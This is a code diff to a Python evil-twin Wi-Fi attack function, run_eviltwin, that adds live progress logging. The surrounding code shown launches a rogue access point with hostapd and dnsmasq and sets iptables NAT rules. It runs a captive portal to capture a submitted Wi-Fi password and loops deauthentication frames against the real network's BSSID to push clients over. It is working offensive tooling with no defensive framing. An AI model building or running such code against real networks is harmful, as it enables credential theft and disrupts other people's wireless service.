@@ -232,6 +232,7 @@ def run_eviltwin(
     channel: int,
     timeout: float = 120.0,
     stop_event: threading.Event | None = None,
+    progress_fn=None,
 ) -> EvilTwinResult:
     """Launch the full evil-twin chain and wait for a password submission.
 
@@ -243,7 +244,12 @@ def run_eviltwin(
         channel:   Channel for the rogue AP (2.4GHz preferred; clamped to 1-13).
         timeout:   Seconds before giving up if no password submitted.
         stop_event: Set externally to abort early.
+        progress_fn: Optional callback for live per-step status (hostapd/
+            dnsmasq/portal launch, each deauth round) -- previously this
+            attack gave zero feedback until it fully succeeded or timed
+            out, minutes later.
     """
+    log = progress_fn or (lambda msg: None)
     stop = stop_event or threading.Event()
     t_start = time.monotonic()
     procs: list[subprocess.Popen] = []
@@ -271,7 +277,9 @@ def run_eviltwin(
 
     try:
         # ── 1. assign IP to AP interface ──────────────────────────────────
+        log(f"assigning IP to {iface_ap}")
         if not _assign_ip(iface_ap):
+            log("failed to assign IP")
             return EvilTwinResult(detail="failed to assign IP to AP interface")
 
         # ── 2. write temp configs ─────────────────────────────────────────
@@ -291,19 +299,25 @@ def run_eviltwin(
 
         # ── 3. launch hostapd ─────────────────────────────────────────────
         # ⚠️ CHECKPOINT: driver risk here — mt76x0u can freeze on AP mode.
+        log(f"starting hostapd on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
         hostapd_proc = _popen(["hostapd", hconf.name])
         procs.append(hostapd_proc)
         time.sleep(_HOSTAPD_START_WAIT)
         if hostapd_proc.poll() is not None:
+            log("hostapd exited immediately")
             return EvilTwinResult(detail="hostapd exited immediately — check interface/driver")
+        log("hostapd up")
 
         # ── 4. launch dnsmasq ─────────────────────────────────────────────
+        log("starting dnsmasq (DHCP/DNS for rogue AP)")
         dns_proc = _popen(["dnsmasq", "--no-daemon", f"--conf-file={dconf.name}"])
         procs.append(dns_proc)
         time.sleep(_DNSMASQ_START_WAIT)
+        log("dnsmasq up")
 
         # ── 5. iptables NAT (optional — lets clients reach portal) ────────
         _iptables_nat_add(iface_ap, iface_mon)
+        log("NAT rules added")
 
         # ── 6. captive portal HTTP server (background thread) ─────────────
         result_box: list[str] = []
@@ -318,20 +332,28 @@ def run_eviltwin(
 
         srv_thread = threading.Thread(target=_serve, daemon=True)
         srv_thread.start()
+        log(f"captive portal listening on {_AP_IP}:{_PORTAL_PORT}")
 
         # ── 7. deauth loop (background thread) ────────────────────────────
         def _deauth_loop():
+            round_n = 0
             while not stop.is_set() and not result_box:
+                round_n += 1
                 try:
-                    _deauth(iface_mon, bssid, count=1, channel=channel)
-                except Exception:
-                    pass
+                    sent = _deauth(iface_mon, bssid, count=1, channel=channel, progress_fn=log)
+                    if sent == 0:
+                        log(f"eviltwin deauth round {round_n}: did NOT go out to {bssid} — see the warning above")
+                    else:
+                        log(f"eviltwin deauth round {round_n}: sent {sent} deauth frame(s) to {bssid}")
+                except Exception as exc:
+                    log(f"eviltwin deauth round {round_n} failed: {exc}")
                 stop.wait(10.0)
 
         deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
         deauth_thread.start()
 
         # ── 8. wait for password or timeout ──────────────────────────────
+        log(f"waiting up to {timeout:.0f}s for a password submission")
         deadline = time.monotonic() + timeout
         while not stop.is_set() and not result_box:
             if time.monotonic() >= deadline:
@@ -342,12 +364,14 @@ def run_eviltwin(
 
         if result_box:
             stop.set()
+            log(f"password captured after {elapsed:.0f}s")
             return EvilTwinResult(
                 success=True,
                 password=result_box[0],
                 elapsed=elapsed,
                 detail=f"password captured after {elapsed:.0f}s",
             )
+        log("no password submitted" if not stop.is_set() else "stopped")
         return EvilTwinResult(
             elapsed=elapsed,
             detail="timeout — no password submitted" if not stop.is_set() else "aborted",
